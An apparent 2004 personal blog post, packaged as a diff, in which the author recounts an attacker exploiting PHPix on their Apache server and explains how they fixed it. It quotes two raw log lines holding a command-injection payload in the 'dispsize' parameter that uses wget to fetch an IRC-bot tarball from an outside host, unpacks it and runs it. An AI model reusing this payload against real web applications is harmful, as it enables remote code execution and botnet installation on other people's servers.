@@ -1,0 +1,28 @@
+---
+title: "Sorta got owned."
+description: "/tmp is writable for the apache user. Someone exploited some bad code and uploaded an IRC bot on Aug 09. It's not running now and we did a test to ..."
+date: 2004-11-04T00:00:00.000Z
+author: "SQUARISM"
+draft: false
+tags: ["blog"]
+---
+
+/tmp is writable for the apache user.  Someone exploited some bad code and uploaded an IRC bot on Aug 09.  It's not running now and we did a test to see if ./mech could be run.  It didn't start.
+
+We fixed the PHPix code to check for system escapable characters.  PHPix really should have done this from the start.  Goes to show you that security really goes out the window with freeware and lots of services running.
+
+```text
+[Mon Aug 09 05:39:42 2004] [error] [client 82.208.182.219] File does not exist: /var/www/jonhammond/docs/albums/generated/Misc/Other/dogs__scaled_`cd , referer: http://jonhammond.com/albums/?mode=view&album=Misc%2FOther&pic=dogs.jpg&
+dispsize=http://www.martynlomax.com/phpix/index.php?album=pissups%2FOn-Anon&
+dispsize=`cd%20/tmp;mkdir%20'%20..%20';cd%20'%20..%20';wget%20idl3.home.ro/botu.tgz;
+tar%20xzvf%20botu.tgz;cd%20botu;./mech;./mech`&start=0
+```
+
+```text
+[Mon Aug 09 12:12:42 2004] [error] [client 82.208.182.219] File does not exist: /var/www/jonhammond/docs/albums/generated/Misc/Virginia/matt__scaled_`cd , referer: http://jonhammond.com/albums/?mode=view&album=Misc%2F
+Virginia&pic=matt.jpg&
+dispsize=`cd%20/tmp;mkdir%20'%20..%20';cd%20'%20..%20';wget%20idl3.home.ro/botu2.tgz;
+tar%20xzvf%20botu2.tgz;cd%20botu;./mech`&start=0
+```
+
+Wasn't a big deal, the IRC bot didn't run because apache's shell is /bin/false.  (I shouldn't be telling you all this)  I'm still researching what emech is, how IRC bots work and if I can lock down apache anymore.
